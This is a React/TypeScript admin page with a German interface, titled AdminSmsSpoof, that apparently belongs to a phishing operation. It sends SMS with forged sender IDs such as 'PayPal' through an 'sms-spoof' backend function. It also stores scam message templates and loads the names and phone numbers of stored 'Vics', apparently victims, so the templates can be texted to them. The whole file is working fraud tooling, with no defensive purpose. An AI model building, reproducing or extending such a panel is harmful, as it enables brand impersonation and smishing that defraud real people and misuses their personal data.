import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/hooks/useAuth";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Label } from "@/components/ui/label";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Send, Loader2, RefreshCw, Plus, Trash2, Search } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

interface SmsHistoryEntry {
  id: string;
  recipient: string;
  sender_id: string;
  message: string;
  response: Record<string, unknown> | null;
  created_at: string;
}

interface SmsTemplate {
  id: string;
  sender_id: string;
  message: string;
  created_by: string | null;
  created_at: string;
}

interface VicUser {
  id: string;
  email: string | null;
  first_name: string | null;
  last_name: string | null;
  phone: string | null;
}

function formatPhone(phone: string): string {
  let cleaned = phone.replace(/[\s\-\/]/g, "");
  if (cleaned.startsWith("+")) cleaned = cleaned.slice(1);
  if (cleaned.startsWith("0")) cleaned = "49" + cleaned.slice(1);
  return cleaned;
}

export default function AdminSmsSpoof() {
  const { user } = useAuth();
  const { toast } = useToast();

  // --- Send Form ---
  const [to, setTo] = useState("");
  const [senderID, setSenderID] = useState("");
  const [text, setText] = useState("");
  const [sending, setSending] = useState(false);

  // --- History ---
  const [history, setHistory] = useState<SmsHistoryEntry[]>([]);
  const [loadingHistory, setLoadingHistory] = useState(true);

  // --- Templates ---
  const [templates, setTemplates] = useState<SmsTemplate[]>([]);
  const [loadingTemplates, setLoadingTemplates] = useState(true);
  const [createOpen, setCreateOpen] = useState(false);
  const [newSenderId, setNewSenderId] = useState("");
  const [newMessage, setNewMessage] = useState("");
  const [savingTemplate, setSavingTemplate] = useState(false);

  // --- Send-to-Vic Dialog ---
  const [sendVicOpen, setSendVicOpen] = useState(false);
  const [selectedTemplate, setSelectedTemplate] = useState<SmsTemplate | null>(null);
  const [vics, setVics] = useState<VicUser[]>([]);
  const [loadingVics, setLoadingVics] = useState(false);
  const [vicSearch, setVicSearch] = useState("");
  const [sendingToVic, setSendingToVic] = useState<string | null>(null);

  const fetchHistory = async () => {
    const { data, error } = await supabase
      .from("sms_spoof_history")
      .select("*")
      .order("created_at", { ascending: false })
      .limit(50);
    if (!error && data) setHistory(data as unknown as SmsHistoryEntry[]);
    setLoadingHistory(false);
  };

  const fetchTemplates = async () => {
    const { data, error } = await supabase
      .from("sms_templates")
      .select("*")
      .order("created_at", { ascending: false });
    if (!error && data) setTemplates(data as unknown as SmsTemplate[]);
    setLoadingTemplates(false);
  };

  useEffect(() => {
    fetchHistory();
    fetchTemplates();
  }, []);

  const handleSend = async () => {
    if (!to || !senderID || !text) {
      toast({ title: "Alle Felder ausfüllen", variant: "destructive" });
      return;
    }
    setSending(true);
    try {
      const { data, error } = await supabase.functions.invoke("sms-spoof", {
        body: { to, senderID, text },
      });
      if (error) throw error;
      toast({ title: "SMS gesendet", description: JSON.stringify(data) });
      setText("");
      fetchHistory();
    } catch (err: any) {
      toast({ title: "Fehler", description: err.message, variant: "destructive" });
    } finally {
      setSending(false);
    }
  };

  const handleCreateTemplate = async () => {
    if (!newSenderId || !newMessage) {
      toast({ title: "Alle Felder ausfüllen", variant: "destructive" });
      return;
    }
    setSavingTemplate(true);
    try {
      const { error } = await supabase.from("sms_templates").insert({
        sender_id: newSenderId,
        message: newMessage,
        created_by: user?.id,
      });
      if (error) throw error;
      toast({ title: "Template erstellt" });
      setNewSenderId("");
      setNewMessage("");
      setCreateOpen(false);
      fetchTemplates();
    } catch (err: any) {
      toast({ title: "Fehler", description: err.message, variant: "destructive" });
    } finally {
      setSavingTemplate(false);
    }
  };

  const handleDeleteTemplate = async (id: string) => {
    const { error } = await supabase.from("sms_templates").delete().eq("id", id);
    if (error) {
      toast({ title: "Fehler", description: error.message, variant: "destructive" });
    } else {
      toast({ title: "Template gelöscht" });
      fetchTemplates();
    }
  };

  const openSendToVic = async (template: SmsTemplate) => {
    setSelectedTemplate(template);
    setSendVicOpen(true);
    setVicSearch("");
    setLoadingVics(true);

    // Load vics with role "user"
    const { data: roles } = await supabase
      .from("user_roles")
      .select("user_id")
      .eq("role", "user");
    if (!roles || roles.length === 0) {
      setVics([]);
      setLoadingVics(false);
      return;
    }
    const userIds = roles.map((r) => r.user_id);
    const { data: profiles } = await supabase
      .from("profiles")
      .select("id, email, first_name, last_name, phone")
      .in("id", userIds);
    setVics((profiles as VicUser[]) || []);
    setLoadingVics(false);
  };

  const handleSendToVic = async (vic: VicUser) => {
    if (!vic.phone) {
      toast({ title: "Keine Telefonnummer hinterlegt", variant: "destructive" });
      return;
    }
    if (!selectedTemplate) return;
    const formattedPhone = formatPhone(vic.phone);
    setSendingToVic(vic.id);
    try {
      const { data, error } = await supabase.functions.invoke("sms-spoof", {
        body: {
          to: formattedPhone,
          senderID: selectedTemplate.sender_id,
          text: selectedTemplate.message,
        },
      });
      if (error) throw error;
      toast({
        title: "SMS gesendet",
        description: `An ${vic.first_name || vic.email} (${formattedPhone})`,
      });
      fetchHistory();
    } catch (err: any) {
      toast({ title: "Fehler", description: err.message, variant: "destructive" });
    } finally {
      setSendingToVic(null);
    }
  };

  const filteredVics = vics.filter((v) => {
    const q = vicSearch.toLowerCase();
    return (
      !q ||
      v.email?.toLowerCase().includes(q) ||
      v.first_name?.toLowerCase().includes(q) ||
      v.last_name?.toLowerCase().includes(q) ||
      v.phone?.includes(q)
    );
  });

  const formatDate = (iso: string) => {
    const d = new Date(iso);
    return d.toLocaleString("de-DE", { day: "2-digit", month: "2-digit", year: "2-digit", hour: "2-digit", minute: "2-digit" });
  };

  return (
    <div className="space-y-6">
      {/* Top: Send Form + History */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Left: Send Form */}
        <Card className="border-gray-200 shadow-none bg-white">
          <CardHeader>
            <CardTitle className="text-lg">SMS senden</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="recipient">Empfänger</Label>
              <Input id="recipient" placeholder="z.B. 49170123456" value={to} onChange={(e) => setTo(e.target.value)} />
            </div>
            <div className="space-y-2">
              <Label htmlFor="senderId">Absender-ID</Label>
              <Input id="senderId" placeholder="z.B. PayPal" value={senderID} onChange={(e) => setSenderID(e.target.value)} />
            </div>
            <div className="space-y-2">
              <Label htmlFor="message">Nachricht</Label>
              <Textarea id="message" placeholder="SMS-Text eingeben..." value={text} onChange={(e) => setText(e.target.value)} rows={4} />
            </div>
            <Button onClick={handleSend} disabled={sending} className="w-full">
              {sending ? <Loader2 className="w-4 h-4 animate-spin mr-2" /> : <Send className="w-4 h-4 mr-2" />}
              Senden
            </Button>
          </CardContent>
        </Card>

        {/* Right: History */}
        <Card className="border-gray-200 shadow-none bg-white">
          <CardHeader className="flex flex-row items-center justify-between">
            <CardTitle className="text-lg">Verlauf</CardTitle>
            <Button variant="ghost" size="icon" onClick={() => { setLoadingHistory(true); fetchHistory(); }}>
              <RefreshCw className="w-4 h-4" />
            </Button>
          </CardHeader>
          <CardContent>
            {loadingHistory ? (
              <div className="flex justify-center py-8">
                <Loader2 className="w-6 h-6 animate-spin text-muted-foreground" />
              </div>
            ) : history.length === 0 ? (
              <p className="text-muted-foreground text-sm text-center py-8">Noch keine SMS gesendet.</p>
            ) : (
              <div className="max-h-[500px] overflow-auto">
                <Table>
                  <TableHeader>
                    <TableRow>
                      <TableHead>Empfänger</TableHead>
                      <TableHead>Absender</TableHead>
                      <TableHead>Nachricht</TableHead>
                      <TableHead>Zeit</TableHead>
                      <TableHead>Status</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {history.map((entry) => (
                      <TableRow key={entry.id}>
                        <TableCell className="font-mono text-xs">{entry.recipient}</TableCell>
                        <TableCell className="text-xs">{entry.sender_id}</TableCell>
                        <TableCell className="text-xs max-w-[150px] truncate">{entry.message}</TableCell>
                        <TableCell className="text-xs whitespace-nowrap">{formatDate(entry.created_at)}</TableCell>
                        <TableCell>
                          <Badge variant={entry.response && (entry.response as any).success ? "default" : "secondary"} className="text-xs">
                            {entry.response && (entry.response as any).success ? "OK" : "?"}
                          </Badge>
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
            )}
          </CardContent>
        </Card>
      </div>

      {/* Templates Section */}
      <div>
        <h2 className="text-lg font-semibold mb-4">SMS Templates</h2>
        {loadingTemplates ? (
          <div className="flex justify-center py-8">
            <Loader2 className="w-6 h-6 animate-spin text-muted-foreground" />
          </div>
        ) : (
          <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-4">
            {/* Create Card */}
            <Card
              className="border-dashed border-2 border-muted-foreground/25 shadow-none bg-transparent flex items-center justify-center min-h-[180px] cursor-pointer hover:border-muted-foreground/50 transition-colors"
              onClick={() => setCreateOpen(true)}
            >
              <div className="flex flex-col items-center gap-2 text-muted-foreground">
                <Plus className="w-8 h-8" />
                <span className="text-sm font-medium">Template erstellen</span>
              </div>
            </Card>

            {/* Template Cards */}
            {templates.map((tpl) => (
              <Card key={tpl.id} className="border-border shadow-none bg-card min-h-[180px] flex flex-col">
                <CardHeader className="pb-2 flex flex-row items-start justify-between space-y-0">
                  <CardTitle className="text-sm font-semibold truncate">{tpl.sender_id}</CardTitle>
                  <Button
                    variant="ghost"
                    size="icon"
                    className="h-6 w-6 text-muted-foreground hover:text-destructive"
                    onClick={() => handleDeleteTemplate(tpl.id)}
                  >
                    <Trash2 className="w-3.5 h-3.5" />
                  </Button>
                </CardHeader>
                <CardContent className="flex-1 flex flex-col justify-between pt-0">
                  <p className="text-xs text-muted-foreground line-clamp-3 mb-3">{tpl.message}</p>
                  <Button size="sm" className="w-full" onClick={() => openSendToVic(tpl)}>
                    <Send className="w-3.5 h-3.5 mr-1.5" />
                    Senden an
                  </Button>
                </CardContent>
              </Card>
            ))}
          </div>
        )}
      </div>

      {/* Create Template Dialog */}
      <Dialog open={createOpen} onOpenChange={setCreateOpen}>
        <DialogContent>
          <DialogHeader>
            <DialogTitle>Template erstellen</DialogTitle>
          </DialogHeader>
          <div className="space-y-4">
            <div className="space-y-2">
              <Label>Absender-ID</Label>
              <Input placeholder="z.B. PayPal" value={newSenderId} onChange={(e) => setNewSenderId(e.target.value)} />
            </div>
            <div className="space-y-2">
              <Label>Nachricht</Label>
              <Textarea placeholder="SMS-Text..." value={newMessage} onChange={(e) => setNewMessage(e.target.value)} rows={4} />
            </div>
          </div>
          <DialogFooter>
            <Button variant="outline" onClick={() => setCreateOpen(false)}>Abbrechen</Button>
            <Button onClick={handleCreateTemplate} disabled={savingTemplate}>
              {savingTemplate && <Loader2 className="w-4 h-4 animate-spin mr-2" />}
              Speichern
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Send-to-Vic Dialog */}
      <Dialog open={sendVicOpen} onOpenChange={setSendVicOpen}>
        <DialogContent>
          <DialogHeader>
            <DialogTitle>Senden an Vic</DialogTitle>
          </DialogHeader>
          <div className="space-y-3">
            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
              <Input
                placeholder="Suchen..."
                value={vicSearch}
                onChange={(e) => setVicSearch(e.target.value)}
                className="pl-9"
              />
            </div>
            {loadingVics ? (
              <div className="flex justify-center py-6">
                <Loader2 className="w-5 h-5 animate-spin text-muted-foreground" />
              </div>
            ) : filteredVics.length === 0 ? (
              <p className="text-sm text-muted-foreground text-center py-6">Keine Vics gefunden.</p>
            ) : (
              <ScrollArea className="h-[300px]">
                <div className="space-y-1">
                  {filteredVics.map((vic) => (
                    <button
                      key={vic.id}
                      className="w-full flex items-center justify-between rounded-md px-3 py-2 text-sm hover:bg-accent transition-colors disabled:opacity-50"
                      disabled={sendingToVic === vic.id || !vic.phone}
                      onClick={() => handleSendToVic(vic)}
                    >
                      <div className="text-left">
                        <div className="font-medium">
                          {vic.first_name} {vic.last_name}
                        </div>
                        <div className="text-xs text-muted-foreground">
                          {vic.phone ? formatPhone(vic.phone) : "Keine Nummer"}
                        </div>
                      </div>
                      {sendingToVic === vic.id ? (
                        <Loader2 className="w-4 h-4 animate-spin" />
                      ) : !vic.phone ? (
                        <Badge variant="secondary" className="text-xs">Keine Nr.</Badge>
                      ) : (
                        <Send className="w-4 h-4 text-muted-foreground" />
                      )}
                    </button>
                  ))}
                </div>
              </ScrollArea>
            )}
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
